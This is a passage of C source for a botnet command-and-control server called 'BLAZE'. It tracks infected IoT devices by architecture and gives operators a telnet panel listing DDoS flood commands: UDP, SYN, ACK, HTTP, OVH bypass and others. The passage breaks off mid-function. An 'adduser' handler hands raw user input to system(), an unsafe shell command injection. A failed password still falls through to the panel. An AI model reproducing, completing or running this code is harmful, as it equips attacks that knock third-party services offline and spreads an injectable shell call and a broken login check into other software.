#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>
#include "resolver.h"

#define MAXFDS 1000000

struct account {
  char clearscreen [2048];
  char user[200];
  char password[200];
  char id [200];
};
static struct account accounts[50];

struct clientdata_t {
  uint32_t ip;
    char x86; 
    char mips;
    char arm;
    char spc;
    char ppc;
    char sh4;
  char connected;
} clients[MAXFDS];

struct telnetdata_t {
  uint32_t ip;
  int connected;
} managements[MAXFDS];



static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int DUPESDELETED = 0;

int fdgets(unsigned char *buf, int bufSize, int fd)
{
  int total = 0, got = 1;
  while (got == 1 && total < bufSize && *(buf + total - 1) != '\n') { got = read(fd, buf + total, 1); total++; }
  return got;
}
void trim(char *str)
{
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (isspace(str[begin])) begin++;
  while ((end >= begin) && isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd)
{
  int flags, s;
  flags = fcntl(sfd, F_GETFL, 0);
  if (flags == -1)
  {
    perror("fcntl");
    return -1;
  }
  flags |= O_NONBLOCK;
  s = fcntl(sfd, F_SETFL, flags);
  if (s == -1)
  {
    perror("fcntl");
    return -1;
  }
  return 0;
}


static int create_and_bind(char *port)
{
  struct addrinfo hints;
  struct addrinfo *result, *rp;
  int s, sfd;
  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;
  s = getaddrinfo(NULL, port, &hints, &result);
  if (s != 0)
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
    return -1;
  }
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
    if (sfd == -1) continue;
    int yes = 1;
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
    s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
    if (s == 0)
    {
      break;
    }
    close(sfd);
  }
  if (rp == NULL)
  {
    fprintf(stderr, "Could not bind\n");
    return -1;
  }
  freeaddrinfo(result);
  return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
  struct epoll_event event;
  struct epoll_event *events;
  int s;
  events = calloc(MAXFDS, sizeof event);
  while (1)
  {
    int n, i;
    n = epoll_wait(epollFD, events, MAXFDS, -1);
    for (i = 0; i < n; i++)
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
      {
        clients[events[i].data.fd].connected = 0;
        clients[events[i].data.fd].arm = 0;
        clients[events[i].data.fd].mips = 0; 
        clients[events[i].data.fd].x86 = 0;
        clients[events[i].data.fd].spc = 0;
        clients[events[i].data.fd].ppc = 0;
        clients[events[i].data.fd].sh4 = 0;
        close(events[i].data.fd);
        continue;
      }
      else if (listenFD == events[i].data.fd)
      {
        while (1)
        {
          struct sockaddr in_addr;
          socklen_t in_len;
          int infd, ipIndex;

          in_len = sizeof in_addr;
          infd = accept(listenFD, &in_addr, &in_len);
          if (infd == -1)
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
            else
            {
              perror("accept");
              break;
            }
          }

          clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

          int dup = 0;
          for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
          {
            if (!clients[ipIndex].connected || ipIndex == infd) continue;

            if (clients[ipIndex].ip == clients[infd].ip)
            {
              dup = 1;
              break;
            }
          }

          if (dup)
          {
            DUPESDELETED++;
            continue;
          }

          s = make_socket_non_blocking(infd);
          if (s == -1) { close(infd); break; }

          event.data.fd = infd;
          event.events = EPOLLIN | EPOLLET;
          s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
          if (s == -1)
          {
            perror("epoll_ctl");
            close(infd);
            break;
          }

          clients[infd].connected = 1;
          send(infd, "~ SC ON\n", 9, MSG_NOSIGNAL);

        }
        continue;
      }
      else
      {
        int thefd = events[i].data.fd;
        struct clientdata_t *client = &(clients[thefd]);
        int done = 0;
        client->connected = 1;
        client->arm = 0; 
        client->mips = 0;
        client->sh4 = 0;
        client->x86 = 0;
        client->spc = 0;
        client->ppc = 0;
        while (1)
        {
          ssize_t count;
          char buf[2048];
          memset(buf, 0, sizeof buf);

          while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
          {
            if (strstr(buf, "\n") == NULL) { done = 1; break; }
            trim(buf);
            if (strcmp(buf, "PING") == 0) {
              if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
              continue;
            } 
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("\"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        client->arm = 0;
                                        client->mips = 0; 
                                        client->sh4 = 0;
                                        client->x86 = 0;
                                        client->spc = 0;
                                        client->ppc = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}

unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}

unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
} 

unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}

unsigned int sh4Connected() 
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].sh4) continue;
                total++;
        }
 
        return total;
}

unsigned int clientsConnected()
{
  int i = 0, total = 0;
  for (i = 0; i < MAXFDS; i++)
  {
    if (!clients[i].connected) continue;
    total++;
  }

  return total;
}

    void *titleWriter(void *sock) 
    {
        int thefd = (long int)sock;
        char string[2048];
        while(1)
        {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; B L A Z E | IOT: %d | USERS: %d %c", '\033', clientsConnected(), managesConnected, '\007');
            if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
            sleep(2);
        }
    }


int Search_in_File(char *str)
{
  FILE *fp;
  int line_num = 0;
  int find_result = 0, find_line = 0;
  char temp[512];

  if ((fp = fopen("BLAZE.txt", "r")) == NULL) {
    return(-1);
  }
  while (fgets(temp, 512, fp) != NULL) {
    if ((strstr(temp, str)) != NULL) {
      find_result++;
      find_line = line_num;
    }
    line_num++;
  }
  if (fp)
    fclose(fp);

  if (find_result == 0)return 0;

  return find_line;
}
void client_addr(struct sockaddr_in addr) {
  printf("[%d.%d.%d.%d]\n",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  FILE *logFile;
  logFile = fopen("IP.log", "a");
  fprintf(logFile, "\nIP:[%d.%d.%d.%d] ",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  fclose(logFile);
}

void *telnetWorker(void *sock) {
  int thefd = (int)sock;
  managesConnected++;
  int find_line;
  pthread_t title;
  char counter[2048];
  memset(counter, 0, 2048);
  char buf[2048];
  char* nickstring;
  char usernamez[80];
  char* password;
  char *admin = "admin";
  char *common = "common"; 
  memset(buf, 0, sizeof buf);
  char botnet[2048];
  memset(botnet, 0, 2048);

  FILE *fp;
  int i = 0;
  int c;
  fp = fopen("BLAZE.txt", "r"); // format: user pass id (common)(admin)
  while (!feof(fp))
  {
    c = fgetc(fp);
    ++i;
  }
  int j = 0;
  rewind(fp);
  while (j != i - 1)
  {
        fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].password, accounts[j].id);
    ++j;
  }
   sprintf(botnet, "\x1b[1;31mUsername\x1b[1;37m: \x1b[1;90m");
  if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
  if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
  trim(buf);
  sprintf(usernamez, buf);
  nickstring = ("%s", buf);
  find_line = Search_in_File(nickstring);

  if (strcmp(nickstring, accounts[find_line].user) == 0) {
    sprintf(botnet, "\x1b[1;31mPassword\x1b[1;37m: \x1b[1;90m");
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    if (strcmp(buf, accounts[find_line].password) != 0) goto failed;
    memset(buf, 0, 2048);   
	
    goto Typhon;
    }
    failed:
    if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		char failed_line1[80];

        if (send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;

        Typhon:
        pthread_create(&title, NULL, &titleWriter, sock); 
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; 
       
        char Typhon_1 [5000]; 
        char Typhon_2 [5000];
        char Typhon_3 [5000];
        char Typhon_4 [5000]; 
        char Typhon_5 [5000];
        char Typhon_6 [5000];
        char Typhon_7 [5000];
        char Typhon_8 [5000];
        char Typhon_9 [5000];
        char Typhon_10 [5000];
        char Typhon_11 [5000]; 
        char Typhon_12 [5000];
        char Typhon_13 [5000];
        char Typhon_14 [5000];
        char Typhon_15 [5000];
        char Typhon_16 [5000];
        char Typhon_17 [5000];
        char Typhon_18 [5000];
        char Typhon_19 [5000];
        char Typhon_20 [5000];


        sprintf(Typhon_1, "\e[38;5;196m                                                         \r\n");
        sprintf(Typhon_2, "\e[38;5;196m                                  ╔╗ ╦  ╔═\e[38;5;15m╗══╗╔═╗                             \r\n");
        sprintf(Typhon_3, "\e[38;5;196m                                  ╠╩╗║  ╠═\e[38;5;15m╣╔═╝║╣                             \r\n");
        sprintf(Typhon_4, "\e[38;5;196m                                  ╚═╝╩═╝╩ \e[38;5;15m╩╚══╚═╝              \r\n");
        sprintf(Typhon_5, "\e[38;5;196m\r\n");
        sprintf(Typhon_6, "\e[38;5;196m╔════════════════════════════════════════╗\e[38;5;15m╔════════════════════════════════════╗\r\n");
        sprintf(Typhon_7, "\e[38;5;196m║ \e[38;5;15mUDP !* UDP IP PORT TIME 32 0 1         \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mTCP !* TCP IP PORT TIME 32 ALL 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_8, "\e[38;5;196m║ \e[38;5;15mNFO  !* NFO IP PORT TIME               \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mSYN !* TCP IP PORT TIME 32 SYN 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_9, "\e[38;5;196m║ \e[38;5;15mSTD !* STD IP PORT TIME                \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mFIN !* TCP IP PORT TIME 32 FIN 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_10, "\e[38;5;196m║ \e[38;5;15mOVH !* OVH IP PORT TIME POWER          \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mRST !* TCP IP PORT TIME 32 RST 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_11, "\e[38;5;196m║ \e[38;5;15mVSE !* VSE IP PORT TIME 32 1024 10     \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mPSH !* TCP IP PORT TIME 32 PSH 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_12, "\e[38;5;196m║ \e[38;5;15mBYPASS !* BYPASS IP PORT TIME 32 0 1   \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mACK !* TCP IP PORT TIME 32 ACK 0 1 \e[38;5;15m║\r\n");
        sprintf(Typhon_13, "\e[38;5;196m╚════════════════════════════════════════╝\e[38;5;15m╚════════════════════════════════════╝\r\n");
        sprintf(Typhon_17, "\e[38;5;196m          ╔═══════════════════════════════\e[38;5;15m═════════════════════════════════╗\r\n");
        sprintf(Typhon_18, "\e[38;5;196m          ║ HTTP Flood !* HTTP [METHOD] [I\e[38;5;15mP] [PORT] / [TIME] [POWER]       ║\r\n");
        sprintf(Typhon_19, "\e[38;5;196m          ╚═══════════════════════════════\e[38;5;15m═════════════════════════════════╝\r\n");
        sprintf(Typhon_20, "\e[38;5;196m\r\n");







        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Typhon_1, strlen(Typhon_1), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Typhon_2, strlen(Typhon_2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_3, strlen(Typhon_3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_4, strlen(Typhon_4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_5, strlen(Typhon_5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_6, strlen(Typhon_6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_7, strlen(Typhon_7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_8, strlen(Typhon_8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_9, strlen(Typhon_9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_10, strlen(Typhon_10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_11, strlen(Typhon_11), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Typhon_12, strlen(Typhon_12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_13, strlen(Typhon_13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_14, strlen(Typhon_14), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_15, strlen(Typhon_15), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_16, strlen(Typhon_16), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_17, strlen(Typhon_17), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_18, strlen(Typhon_18), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_19, strlen(Typhon_19), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Typhon_20, strlen(Typhon_20), MSG_NOSIGNAL) == -1) goto end;

        while(1) 
        { 
        sprintf(botnet, "\x1b[1;91m[\x1b[1;97m%s\x1b[1;91m @\x1b[1;97m B L A Z E \x1b[1;91m]\x1b[1;97m: \x1b[1;91m", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;

        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
        if (strstr(buf, "bots") || strstr(buf, "BOTS") || strstr(buf, "botcount") || strstr(buf, "BOTCOUNT") || strstr(buf, "COUNT") || strstr(buf, "count")) {
	      {
	    char total[128];
        sprintf(total, "\x1b[1;31mClients Connected  \x1b[1;37m[\x1b[1;31m%d\x1b[1;37m]\r\n", clientsConnected());
        if (send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;91m[\x1b[1;97m%s\x1b[1;91m @\x1b[1;97m B L A Z E \x1b[1;91m]\x1b[1;97m: \x1b[1;91m", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }
        continue;
        }
        }
        if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "Help") || strstr(buf, "?"))  
        {
        
        char help_line1  [5000];
        char help_coms2  [5000];
        char help_coms3  [5000];
        char help_coms4  [5000];
        char help_coms5  [5000];
        char help_coms6  [5000];
        char help_coms7  [5000];
        char help_coms8  [5000];
        char help_coms9  [5000];
        char help_coms10  [5000];

        sprintf(help_line1, "\e[38;5;196m\r\n");
        sprintf(help_coms2, "\e[38;5;196m ╔═════════════════════════════════╗\r\n");    
        sprintf(help_coms3, "\e[38;5;196m ║\e[38;5;15m  CLEAR           Clears Screen  \e[38;5;196m║\r\n");
        sprintf(help_coms4, "\e[38;5;196m ║\e[38;5;15m  METHODS         Shows Methods  \e[38;5;196m║\r\n");
        sprintf(help_coms5, "\e[38;5;196m ║\e[38;5;15m  RULES           Shows Rules    \e[38;5;196m║\r\n");
        sprintf(help_coms6, "\e[38;5;196m ║\e[38;5;15m  LOGOUT          Logs You Out   \e[38;5;196m║\r\n");
        sprintf(help_coms7, "\e[38;5;196m ║\e[38;5;15m  ADMIN           Admin Commands \e[38;5;196m║\r\n");
        sprintf(help_coms8, "\e[38;5;196m ║\e[38;5;15m  RESOLVER        Shows Resolver \e[38;5;196m║\r\n");
        sprintf(help_coms9, "\e[38;5;196m ╚═════════════════════════════════╝ \r\n");
        sprintf(help_coms10, "\e[38;5;196m\r\n");

        
        if(send(thefd, help_line1, strlen(help_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms2, strlen(help_coms2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms3, strlen(help_coms3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms4, strlen(help_coms4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms5, strlen(help_coms5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms6, strlen(help_coms6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms7, strlen(help_coms7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms8, strlen(help_coms8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms9, strlen(help_coms9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms10, strlen(help_coms10),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;91m[\x1b[1;97m%s\x1b[1;91m @\x1b[1;97m B L A Z E \x1b[1;91m]\x1b[1;97m: \x1b[1;91m", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }
        continue;
        }
        if(strstr(buf, "METHODS") || strstr(buf, "METHOD") || strstr(buf, "methods") || strstr(buf, "Methods")) 
        {
        
        char stress_line1  [5000];
        char stress_line2  [5000];
        char stress_line3  [5000];
        char stress_line4  [5000];
        char stress_line5  [5000];
        char stress_line6  [5000];
        char stress_line7  [5000];
        char stress_line8  [5000];
        char stress_line9  [5000];
        char stress_line10 [5000];
        char stress_line11 [5000];
        char stress_line12 [5000];
        char stress_line13 [5000];

        
        sprintf(stress_line1, "\e[38;5;196m\r\n");
        sprintf(stress_line2, "\e[38;5;196m╔════════════════════════════════════════╗\e[38;5;15m╔════════════════════════════════════╗\r\n");
        sprintf(stress_line3, "\e[38;5;196m║ \e[38;5;15mUDP !* UDP IP PORT TIME 32 0 1         \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mTCP !* TCP IP PORT TIME 32 ALL 0 1 \e[38;5;15m║\r\n");
        sprintf(stress_line4, "\e[38;5;196m║ \e[38;5;15mNFO !* NFO IP PORT TIME                \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mSYN !* TCP IP PORT TIME 32 SYN 0 1 \e[38;5;15m║\r\n");
        sprintf(stress_line5, "\e[38;5;196m║ \e[38;5;15mSTD !* STD IP PORT TIME                \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mFIN !* TCP IP PORT TIME 32 FIN 0 1 \e[38;5;15m║\r\n");
        sprintf(stress_line6, "\e[38;5;196m║ \e[38;5;15mOVH !* OVH IP PORT TIME POWER           e[38;5;196m║\e[38;5;15m║ \e[38;5;196mRST !* TCP IP PORT TIME 32 RST 0 1 \e[38;5;15m║\r\n");
        sprintf(stress_line7, "\e[38;5;196m║ \e[38;5;15mVSE !* VSE IP PORT TIME 32 1024 10     \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mPSH !* TCP IP PORT TIME 32 PSH 0 1 \e[38;5;15m║\r\n");
        sprintf(stress_line8, "\e[38;5;196m║ \e[38;5;15mBYPASS !* BYPASS IP PORT TIME 32 0 1   \e[38;5;196m║\e[38;5;15m║ \e[38;5;196mACK !* TCP IP PORT TIME 32 ACK 0 1 \e[38;5;15m║\r\n");
        sprintf(stress_line9, "\e[38;5;196m╚════════════════════════════════════════╝\e[38;5;15m╚════════════════════════════════════╝\r\n");
        sprintf(stress_line10, "\e[38;5;196m          ╔═══════════════════════════════\e[38;5;15m═════════════════════════════════╗\r\n");
        sprintf(stress_line11, "\e[38;5;196m          ║ HTTP Flood !* HTTP [METHOD] [I\e[38;5;15mP] [PORT] / [TIME] [POWER]       ║\r\n");
        sprintf(stress_line12, "\e[38;5;196m          ╚═══════════════════════════════\e[38;5;15m═════════════════════════════════╝\r\n");
        sprintf(stress_line13, "\e[38;5;196m\r\n");
 
        
        if(send(thefd, stress_line1, strlen(stress_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line2, strlen(stress_line2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line3, strlen(stress_line3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line4, strlen(stress_line4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line5, strlen(stress_line5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line6, strlen(stress_line6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line7, strlen(stress_line7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line8, strlen(stress_line8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line9, strlen(stress_line9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line10, strlen(stress_line10),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line11, strlen(stress_line11),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line12, strlen(stress_line12),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, stress_line13, strlen(stress_line13),   MSG_NOSIGNAL) == -1) goto end;
        
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;91m[\x1b[1;97m%s\x1b[1;91m @\x1b[1;97m B L A Z E \x1b[1;91m]\x1b[1;97m: \x1b[1;91m", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }
        continue;
        }
        if(strstr(buf, "RULES") || strstr(buf, "rules")) 
        { 
        RULES:
        pthread_create(&title, NULL, &titleWriter, sock);
    
        char rule_line1  [5000];
        char rule_2  [5000];
        char rule_3  [5000];
        char rule_4  [5000];
        char rule_5  [5000];
        char rule_6  [5000];
        char rule_7  [5000];
        char rule_8  [5000];
        char rule_9  [5000];
        char rule_10  [5000];
        
 
        sprintf(rule_line1, "\x1b[1;31m\r\n");
        sprintf(rule_2, "\e[38;5;196m╔═══════════════════════════════════════╗\r\n");
        sprintf(rule_3, "\e[38;5;196m║ \e[38;5;15m1. No Sharing Logins                  \e[38;5;196m║\r\n");
        sprintf(rule_4, "\e[38;5;196m║ \e[38;5;15m2. No Hitting The Net                 \e[38;5;196m║\r\n");
        sprintf(rule_5, "\e[38;5;196m║ \e[38;5;15m3. No Hitting Government Sites        \e[38;5;196m║\r\n");
        sprintf(rule_6, "\e[38;5;196m║ \e[38;5;15m4. No Spam Attacks                    \e[38;5;196m║\r\n");
        sprintf(rule_7, "\e[38;5;196m║ \e[38;5;15m5. Do Not Resell The Source           \e[38;5;196m║\r\n");
        sprintf(rule_8, "\e[38;5;196m║ \e[38;5;15m6. We Are Not Responsible For The Use \e[38;5;196m║\r\n"); 
        sprintf(rule_9, "\e[38;5;196m╚═══════════════════════════════════════╝\r\n");
        sprintf(rule_10, "\e[38;5;196m\r\n");
        
    
        if(send(thefd, rule_line1,  strlen(rule_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_2,  strlen(rule_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_3,  strlen(rule_3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_4,  strlen(rule_4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_5,  strlen(rule_5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_6,  strlen(rule_6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_7,  strlen(rule_7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_8,  strlen(rule_8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_9,  strlen(rule_9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, rule_10,  strlen(rule_10),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;91m[\x1b[1;97m%s\x1b[1;91m @\x1b[1;97m B L A Z E \x1b[1;91m]\x1b[1;97m: \x1b[1;91m", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }
        continue;
        }
        if(strstr(buf, "admin") || strstr(buf, "ADMIN")) 
        { 
        id:
        pthread_create(&title, NULL, &titleWriter, sock);
        
        char id_line1  [5000];
        char id_2  [5000];
        char id_3  [5000];
        char id_4  [5000];
        char id_5  [5000];
 
        sprintf(id_line1, "\e[38;5;196m\r\n");
        sprintf(id_2,     "\e[38;5;196m╔═════════════════════════════════════════════════╗\r\n");
        sprintf(id_3,     "\e[38;5;196m║ \e[38;5;15mAdd User          [adduser]    [USER] [PASS]    \e[38;5;196m║\r\n");
        sprintf(id_4,     "\e[38;5;196m╚═════════════════════════════════════════════════╝\r\n");
        sprintf(id_5,     "\e[38;5;196m\r\n");
        
        if(send(thefd, id_line1,  strlen(id_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, id_2,  strlen(id_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, id_3,  strlen(id_3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, id_4,  strlen(id_4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, id_5,  strlen(id_5),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;91m[\x1b[1;97m%s\x1b[1;91m @\x1b[1;97m B L A Z E \x1b[1;91m]\x1b[1;97m: \x1b[1;91m", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }
        continue;
        }
        if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
        {
        if(strcmp(admin, accounts[find_line].id) == 0)
        {
        char *token = strtok(buf, " ");
        char *userinfo = token+sizeof(token);
        trim(userinfo);
        char *uinfo[50];
        sprintf(uinfo, "echo '%s' >> BLAZE.txt", userinfo);
        system(uinfo);
